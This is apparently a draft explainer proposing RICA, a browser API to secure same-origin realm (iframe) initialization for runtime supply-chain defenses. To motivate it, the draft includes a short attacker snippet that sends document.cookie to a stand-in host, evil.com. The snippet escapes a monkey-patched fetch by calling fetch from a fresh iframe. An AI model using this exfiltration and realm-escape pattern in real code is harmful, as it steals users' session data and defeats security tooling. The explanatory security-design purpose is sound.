# RICA

> _**R**ealms **I**nitialization **C**ontrol **A**PI proposal (to introduce **security** to [same origin realms](#Same-Origin-Realm) in web applications)_

The **R**ealms **I**nitialization **C**ontrol **A**PI (refered to as **RICA**) should allow developers to securely tap into the creation moment of [same origin realms](#Same-Origin-Realm) within their web application in order to tame and control them.

While from a **usability** point of view this is already natively provided by the platform by using `load` events of iframes for example:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://payment-iframe.com/';
iframe.style.display = 'none';
iframe.onload = () => iframe.style.display = 'block';
document.body.appendChild(iframe);
```

**RICA** attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly different, because of how [same origin realms](#Same-Origin-Realm) can be manipulated against security mechanizms the app might wish to dictate.

## Table of contents
 
TBD

## Motivation

The problem with [same origin realms](#Same-Origin-Realm) (also known as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf)) isn't intuitive to comprehend becase it comes into play only when trying to harnest the power of [virtualization in JavaScript](#Virtualization-(in-JavaScript)) in favor of providing advanced security to web apps, which isn't a common usage for JavaScript to begin with, as it primarily aimed at addressing security concerns.

However, we see the importance of such use cases - while JavaScript is a great language for creating composable software, it isn't designed well enough to do so securely, especially when adjusted to run in the browser and interact with the DOM.

And since there is a clear rise in the need for easily composing web applications due to the increase in supply chain driven development, it is important to allow so.

Unfortuantly, securing a supply chain is inherently far harder than defending against good old XSS - while the latter is a rather straight forward lack of input sanitization, telling good code from bad code within the supply chain of an application is more abstract. That's why there are so many different angles to attempt to address this issue, whether at the application's runtime or its build time.

One great way to approach this problem at runtime is by [virtualization](#Virtualization-(in-JavaScript)) - redefining JavaScript [capabilities](#Capabilities) at runtime (commonly known as [monkey patching](https://blog.openreplay.com/monkey-patching-in-javascript/)) to behave similarly while hardening their security to make an effort in telling bad code from good code.

Best explained by an example.

## Example

I have a web app accessible online via `https://ticket-king.com/` where people can order tickets to music concertes.

Like most of the web, the client side of my app is rather complex, because building a fast and resilient app that allows people to purchase tickets online isn't an easy task.

My app needs to have:

- Great UI (which is both fast and built of composable componenets)
- Great network communication layer (to easily communicate with my server)
- Some layer for validating user input (name, email, etc)
- Some component for actually accepting credit card information (for being able to charge the user for their purchase)
- A third party tool for showing ads
- A third party tool for monitoring my application for exceptions
- A third party tool for monitoring user activity to study their experience

And the list goes on. 

Luckily, web apps are written in JavaScript, a great language for creating composable software. 

This means I don't have to implement all of the above by myself - The JavaScript ecosystem is designed to encourge developers to answer such needs by creating software that exports the different functionalities I need.
In other words, I don't need to build code that pulls and shows ads - someone already did it for me. Same goes for input validation, monitoring services and basically for anything.

The downside is pretty big though: by including such services in my application, I effectively grant them full access to it, which can easily escalate into a security breach of my application, whether if by the maintainer of the code I include going evil or getting compromised into introducing malicious code by some other evil party.

This jeopardizes the safety of my application - which translates into putting my users at risk.

Fortunately, this naturally encourged the creation of security tools to be similarly included in web application to help monitor for such potential malicious attacks, a great initiative allowing owners of web apps to easily protect their users. 

Therefore, I choose to integrate `monitor.js` - a JavaScript runtime security tool for enhancing the security of my app by blocking exfiltration of sensitive PII data:

```javascript
// monitor.js - redefine fetch API to block leakage of PII data:

const realFetch = window.fetch;
window.fetch = function(resource, options) {
  if (containsPII(resource, options)) {
    throw new Error(`fetch to "${resource}" is blocked for containing sensitive PII!`);
  }
  return realFetch.call(this, resource, options);
};
```

Great! I might not be able to tell which of the many components I built my app on is breached and when might it happen, but I can rest assure that even if that happens, leakage of my users' sensitive PII data won't be possible, right?

If only it was that simple:

```javascript
// malicious code by attacker - easily escape protection by using a
// fresh fetch API instance from a new same origin realm

const url = `https://evil.com/stealPII?cookie=` + document.cookie;
try {
  fetch(url);
} catch (err) {
  const ifr = document.createElement('iframe');
  const realm = document.body.appendChild(ifr).contentWindow;
  realm.fetch(url); // bypass is successful
}
```

And just like that - `monitor.js` is bypassed and remains absolutly useles. 

It's important to understand - this isn't the fault of `monitor.js`. The web is just not designed to handle such a problem, it isn't part of the threat model.

~~~ we need rica

## Terminology

### Capabilities

APIs provided by the JavaScript and/or browser execution environment (e.g. `Array`, `Object`, `fetch`, `document`, etc).

### Virtualization (in JavaScript)

Virtualization is an abstract concept that could mean many things depends on the context. In the context of JavaScript, this refers to the action of redefining builtin [capabilities](#Capabilities) in the language in order to introduce more logic into them and enhance their value.

### Realm

The technical terminology for the execution environment provided in JavaScript along with a distinct set of [capabilities](#Capabilities) mostly reachable by a representing global object. In the browser environment, the global object is accessible via `window`. Realms can be formed in various ways in the browser ecosystem, most commonly by creating `iframe`s, opening tabs or popup windows using `open` API, using `Worker`s and more. Each of those have its own set of [capabilities](#Capabilities), its own execution environment and its own global object - its own realm ([learn more](https://weizmangal.com/2022/10/28/what-is-a-realm-in-js/)).

### Same Origin Realm

In the browser ecosystem, [realms](#Realm) are associated with an origin. For example, when loading `https://facebook.com/` into the browser, the app loads into a new [realm](#Realm) that is associated with the `facebook.com` origin. Additionally, at any point the app can decide to initialize a child [realm](#Realm), and that [realm](#Realm) can also be associated with an origin. For example, if the `https://facebook.com/` app attaches into its DOM an iframe directed at `https://facebook.com/iframe-page.html`, it'll trigger the creation of a second [realm](#Realm) living within the app at runtime. And since its origin is also `facebook.com`, the two [realms](#Realm) have the same origin - hence the name.

### Cross Origin Realm

The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross origin realm to realm B, and vice versa.
